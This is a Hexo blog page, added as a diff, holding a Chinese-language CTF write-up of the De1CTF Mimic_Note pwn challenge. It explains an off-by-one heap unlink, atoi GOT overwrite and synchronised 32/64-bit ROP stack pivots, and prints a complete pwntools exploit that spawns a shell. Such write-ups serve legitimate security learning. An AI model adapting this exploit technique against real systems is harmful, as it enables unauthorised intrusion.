@@ -1,0 +1,1016 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="de1ctf Mimic_Note前言第二题做的我又自闭了，想想七哥和姚老板比赛当日拿这么难的方法抢到了三血真是太厉害了，后来看官方的wp说程序的mimic_server并不是要求同时跑通64和32，而是只要输出一致即可，所以程序考察的是不泄露libc的ROP，可以用re2dl_resolve做，但是学长的exp是直接实现了一个拟态的exp，里面用到了很多我找都没找到的gadgets。。最重要的是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="De1CTF Mimic_Note">
+<meta property="og:url" content="http://yoursite.com/2019/12/12/mimic_note/index.html">
+<meta property="og:site_name" content="Ama2in9">
+<meta property="og:description" content="de1ctf Mimic_Note前言第二题做的我又自闭了，想想七哥和姚老板比赛当日拿这么难的方法抢到了三血真是太厉害了，后来看官方的wp说程序的mimic_server并不是要求同时跑通64和32，而是只要输出一致即可，所以程序考察的是不泄露libc的ROP，可以用re2dl_resolve做，但是学长的exp是直接实现了一个拟态的exp，里面用到了很多我找都没找到的gadgets。。最重要的是">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-12-12T03:48:23.244Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="De1CTF Mimic_Note">
+<meta name="twitter:description" content="de1ctf Mimic_Note前言第二题做的我又自闭了，想想七哥和姚老板比赛当日拿这么难的方法抢到了三血真是太厉害了，后来看官方的wp说程序的mimic_server并不是要求同时跑通64和32，而是只要输出一致即可，所以程序考察的是不泄露libc的ROP，可以用re2dl_resolve做，但是学长的exp是直接实现了一个拟态的exp，里面用到了很多我找都没找到的gadgets。。最重要的是">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/12/12/mimic_note/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>De1CTF Mimic_Note | Ama2in9</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ama2in9</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/12/mimic_note/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ama2in9">
+      <meta itemprop="description" content="Seeing how far I have been.">
+      <meta itemprop="image" content="/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ama2in9">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">De1CTF Mimic_Note
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-12-12 11:48:23" itemprop="dateCreated datePublished" datetime="2019-12-12T11:48:23+08:00">2019-12-12</time>
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/12/12/mimic_note/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/12/12/mimic_note/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/12/12/mimic_note/" class="leancloud_visitors" data-flag-title="De1CTF Mimic_Note">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="de1ctf-Mimic-Note"><a href="#de1ctf-Mimic-Note" class="headerlink" title="de1ctf Mimic_Note"></a>de1ctf Mimic_Note</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第二题做的我又自闭了，想想七哥和姚老板比赛当日拿这么难的方法抢到了三血真是太厉害了，后来看官方的wp说程序的mimic_server并不是要求同时跑通64和32，而是只要输出一致即可，所以程序考察的是不泄露libc的ROP，可以用re2dl_resolve做，但是学长的exp是直接实现了一个拟态的exp，里面用到了很多我找都没找到的gadgets。。最重要的是拟态题的数据错位输入和一些同步触发的要求，这题自己也做不出，只能看着学长的exp慢慢调试，感觉收获了很多。</p>
+<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>libc2.23，程序可以new、edit、free、其中edit有一个off-by-one，固定多输入一个零字符。got表可写。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>基本思路是unlink之后修改atoi为某个gadgets触发栈迁移，之后把write@got改成syscall。具体实现过程中要注意修改atoi的操作要32和64同步进行，顺序修改的时候会引发异常(比如修改32的atoi再修改64的aoti在32位运行时第二次修改已经不能正常使用edit)。</p>
+<p>为了解决同时修改atoi：32和64在heap_list各占据一块位置，unlink后32位在heap_list_0处放p32(atoi_got_32)，64位在heap_list_0处方p64(atoi_got_64-8)，这样一次Edit(p32(gadgets_32)+p32(0)+p64(gadgets_64))即可同步修改两个atoi。</p>
+<p>另一个问题是如何在一次输入数据时候触发两个ROP(顺序触发ROP还是之前说的问题，atoi不能正常使用之后第二次的edit是不能用的)。这个在stkof里我们有经验，要利用数据的错位，比如32位里可以直接pop ebp;leave ret;而64位可以把前8字节数据pop到rsi再pop rbp,leave ret;这样(即使这样，32位的栈迁移gadgets也没有找到)。</p>
+<p>一些细节：因为64位要输入两次数据，32位输入一次数据，我们可以把32位的输入放后面并且在32的ROP里加入前两次输入，而64不需要管这些，后面拿到shell之后send一次垃圾数据也无所谓。</p>
+<p>unlink之后覆写不要挑free的块写，因为在另一个arch下这里是不能写的。</p>
+<p>还有ROP本身的问题，64bit ROP通过read设置rax，之后通过csu拿shell，但是32bit始终做不到ebx=binsh_addr的时候ecx=edx=0，看了17的exp发现并不是通过read设置的eax，而是通过先pop ebp设置ebp  = 0x2c+0xb,后用lea eax,[ebp-0x2c]设置eax=0xb，在此之前read(0,0,0)将eax,ebx,ecx,edx全部清空，从而构造完成，注意之后还要call一次atoi，这时atoi已经被改为gadgets，因此要再迁回bss上，最后p_ebx再syscall即可。</p>
+<p>关键gadgets:</p>
+<ol>
+<li><p>32atoi-&gt;gadgets:(found by 17)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">text:080489EE                 add     esp, 10h</span><br><span class="line">.text:080489F1                 cmp     edi, esi</span><br><span class="line">.text:080489F3                 jnz     short loc_80489D8</span><br><span class="line">.text:080489F5</span><br><span class="line">.text:080489F5 loc_80489F5:                            ; CODE XREF: __libc_csu_init+2E↑j</span><br><span class="line">.text:080489F5                 add     esp, 0Ch</span><br><span class="line">.text:080489F8                 pop     ebx</span><br><span class="line">.text:080489F9                 pop     esi</span><br><span class="line">.text:080489FA                 pop     edi</span><br><span class="line">.text:080489FB                 pop     ebp</span><br><span class="line">.text:080489FC                 retn</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>64atoi-&gt;gadgets:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400c2f : pop rbp ; pop r14 ; pop r15 ; ret</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>32栈迁移gadgets-&gt;leave_ret_32</p>
+</li>
+<li><p>64栈迁移gadgets:(注意pop rsp之后就迁移到bss了)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400c2d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>32设置eax</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:08048907                 lea     eax, [ebp-2Ch]</span><br><span class="line">.text:0804890A                 push    eax             ; nptr</span><br><span class="line">.text:0804890B                 call    _atoi</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">elf64 = ELF(<span class="string">'./mimic_note_64'</span>)</span><br><span class="line">elf32 = ELF(<span class="string">'./mimic_note_32'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment">#p = process('./mimic_note_64')</span></span><br><span class="line">    p = process(<span class="string">'./mimic_note_32'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'45.32.120.212'</span>,<span class="number">6666</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'size?\n'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index ?\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index ?\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index ?\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'content?'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#64 bit unlink</span></span><br><span class="line">    heap_lis_64 = <span class="number">0x6020A0</span></span><br><span class="line">    fd = heap_lis_64 - <span class="number">0x18</span></span><br><span class="line">    bk = heap_lis_64 - <span class="number">0x10</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(fd)+p64(bk)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x30</span>)</span><br><span class="line">    New(<span class="number">0x38</span>)<span class="comment">#0</span></span><br><span class="line">    New(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">    New(<span class="number">0xf7</span>)<span class="comment">#2</span></span><br><span class="line">    <span class="comment">#paddings</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        New(<span class="number">0x68</span>)<span class="comment">#3-12</span></span><br><span class="line">    New(<span class="number">0x1c</span>)<span class="comment">#13</span></span><br><span class="line">    New(<span class="number">0xfc</span>)<span class="comment">#14</span></span><br><span class="line">    New(<span class="number">0xf7</span>)<span class="comment">#15</span></span><br><span class="line">    Edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#32 bit unlink</span></span><br><span class="line">    heap_lis_32 = <span class="number">0x0804a060</span></span><br><span class="line">    fd = heap_lis_32 + <span class="number">8</span>*<span class="number">13</span> - <span class="number">0xc</span></span><br><span class="line">    bk = heap_lis_32 + <span class="number">8</span>*<span class="number">13</span> - <span class="number">0x8</span></span><br><span class="line">    payload = p32(<span class="number">0</span>)+p32(<span class="number">0x18</span>)+p32(fd)+p32(bk)+<span class="string">"a"</span>*<span class="number">8</span>+p32(<span class="number">0x18</span>)</span><br><span class="line">    Edit(<span class="number">13</span>,payload)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#64 bit ROP</span></span><br><span class="line">    bss_64 = elf64.bss()+<span class="number">0x200</span></span><br><span class="line">    atoi_got_64 = elf64.got[<span class="string">'atoi'</span>]</span><br><span class="line">    write_got_64 = elf64.got[<span class="string">'write'</span>]</span><br><span class="line">    write_plt_64 = elf64.plt[<span class="string">'write'</span>]</span><br><span class="line">    read_plt_64 = elf64.plt[<span class="string">'read'</span>]</span><br><span class="line">    read_got_64 = elf64.got[<span class="string">'read'</span>]</span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">    payload += p64(heap_lis_64)+p64(<span class="number">0x1000</span>)</span><br><span class="line">    Edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">    payload = p64(atoi_got_64<span class="number">-8</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">    payload += p64(bss_64)+p64(<span class="number">0x100</span>)</span><br><span class="line">    payload += p64(bss_64)+p64(<span class="number">0x100</span>)</span><br><span class="line">    payload += p64(write_got_64)</span><br><span class="line">    Edit(<span class="number">0</span>,payload)</span><br><span class="line">    <span class="comment">#csu</span></span><br><span class="line">    p_rdi = <span class="number">0x400c33</span></span><br><span class="line">    p_rsi_r15 = <span class="number">0x400c31</span></span><br><span class="line">    rop_64 = <span class="string">"/bin/sh\x00"</span>+p64(bss_64+<span class="number">0x200</span>)</span><br><span class="line">    <span class="comment">#set rax</span></span><br><span class="line">    rop_64 += p64(p_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">    rop_64 += p64(p_rsi_r15)+p64(write_got_64)+p64(<span class="number">0</span>)</span><br><span class="line">    rop_64 += p64(read_plt_64)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    rop_64 += p64(<span class="number">0x400c2a</span>)</span><br><span class="line">    rop_64 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got_64)+p64(<span class="number">0x100</span>)+p64(bss_64+<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x400c10</span>)+<span class="string">'a'</span>*<span class="number">0x38</span></span><br><span class="line">    rop_64 += p64(<span class="number">0x400c2a</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_got_64)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(bss_64)+p64(<span class="number">0x400c10</span>)+<span class="string">'a'</span>*<span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">2</span>,rop_64)</span><br><span class="line">    <span class="comment">#set rax=59</span></span><br><span class="line">    <span class="comment">#ovwerite aoti</span></span><br><span class="line">    p_rbp64 = <span class="number">0x400770</span></span><br><span class="line">    leave_ret64 = <span class="number">0x4008b7</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x400b32')</span></span><br><span class="line">        <span class="comment">#trigger 64</span></span><br><span class="line">    atoi_got_32 = elf32.got[<span class="string">'atoi'</span>]</span><br><span class="line">    read_got_32 = elf32.got[<span class="string">'read'</span>]</span><br><span class="line">    read_plt_32 = elf32.plt[<span class="string">'read'</span>]</span><br><span class="line">    write_got_32 = elf32.got[<span class="string">'write'</span>]</span><br><span class="line">    write_plt_32 = elf32.plt[<span class="string">'write'</span>]</span><br><span class="line">    <span class="comment">#32 bit ROP</span></span><br><span class="line">    bss_32 = elf32.bss()+<span class="number">0x100</span></span><br><span class="line">    Edit(<span class="number">13</span>,p32(<span class="number">0x100</span>)+p32(heap_lis_32)+p32(<span class="number">0x100</span>)+p32(bss_32)+p32(<span class="number">0x200</span>))</span><br><span class="line">    Edit(<span class="number">12</span>,p32(atoi_got_32)+p32(<span class="number">0x100</span>))</span><br><span class="line">    <span class="comment">#12:aoti_got</span></span><br><span class="line">    <span class="comment">#13:bss</span></span><br><span class="line">    leave_ret32 = <span class="number">0x08048568</span></span><br><span class="line">    p4_32 = <span class="number">0x80489f8</span></span><br><span class="line">    p_ebx_32 = <span class="number">0x08048439</span></span><br><span class="line">    rop32 = <span class="string">"/bin/sh\x00"</span>+p32(bss_32+<span class="number">0x100</span>)</span><br><span class="line">    <span class="comment">#set syscall</span></span><br><span class="line">    rop32 += p32(read_plt_32)+p32(p4_32)+p32(<span class="number">0</span>)+p32(bss_32+<span class="number">0x300</span>)+p32(<span class="number">0x100</span>)+p32(bss_32+<span class="number">0xc</span>+<span class="number">0x14</span>)<span class="comment">#for rop64</span></span><br><span class="line">    rop32 += p32(read_plt_32)+p32(p4_32)+p32(<span class="number">0</span>)+p32(bss_32+<span class="number">0x300</span>)+p32(<span class="number">0x100</span>)+p32(bss_32+<span class="number">0xc</span>+<span class="number">0x14</span>)<span class="comment">#for rop64</span></span><br><span class="line">    rop32 += p32(read_plt_32)+p32(p4_32)+p32(<span class="number">0</span>)+p32(write_got_32)+p32(<span class="number">0x100</span>)+p32(bss_32+<span class="number">0xc</span>+<span class="number">0x14</span>)</span><br><span class="line">    <span class="comment">#set eax</span></span><br><span class="line">    rop32 += p32(read_plt_32)+p32(p4_32)+p32(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">    rop32 += p32(<span class="number">0x080489f9</span>)+p32(<span class="number">0</span>)*<span class="number">2</span>+p32(<span class="number">0xb</span>+<span class="number">0x2c</span>)+p32(<span class="number">0x08048907</span>)</span><br><span class="line">    rop32 += p32(<span class="number">0</span>)*<span class="number">9</span></span><br><span class="line">    rop32 += p32(<span class="number">0x08048588</span>)</span><br><span class="line">    rop32 += p32(p_ebx_32)+p32(<span class="number">0x804a1f4</span>)+p32(write_plt_32)+<span class="string">"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">13</span>,rop32)</span><br><span class="line">    <span class="comment">#migration</span></span><br><span class="line">    mig_32 = <span class="number">0x080489ee</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#set migration</span></span><br><span class="line">    prbp_2ret_64 = <span class="number">0x400c2f</span></span><br><span class="line">    Edit(<span class="number">0</span>,p32(mig_32)+p32(<span class="number">0</span>)+p64(prbp_2ret_64))</span><br><span class="line">    <span class="comment">#p.sendafter("&gt;&gt; ",p64(p_rbp64)+p64(bss_64+8)+p64(leave_ret64))</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x0804890b')</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x400b32')</span></span><br><span class="line">    p.sendafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"a"</span>*<span class="number">4</span>+<span class="string">"b"</span>*<span class="number">4</span>+p32(bss_32+<span class="number">8</span>)+p32(leave_ret32)+p64(<span class="number">0x400c2d</span>)+p64(bss_64<span class="number">-8</span>)[:<span class="number">6</span>])</span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(<span class="string">'\xbe'</span>)</span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(<span class="string">"\x00"</span>*<span class="number">59</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#p.sendafter("&gt;&gt; ","a"*4+"b"*4+p32(bss_32+8)+p32(leave_ret32))</span></span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(<span class="string">"\x8c"</span>)</span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+<h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>花了两天时间才差不多搞懂，要再膜一些17学长和姚老板，路漫漫其修远其，吾将上下而求索。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://sunichi.github.io/2019/08/08/de1ctf19-pwn/" target="_blank" rel="noopener">17师傅</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持将鼓励我继续创作</div>
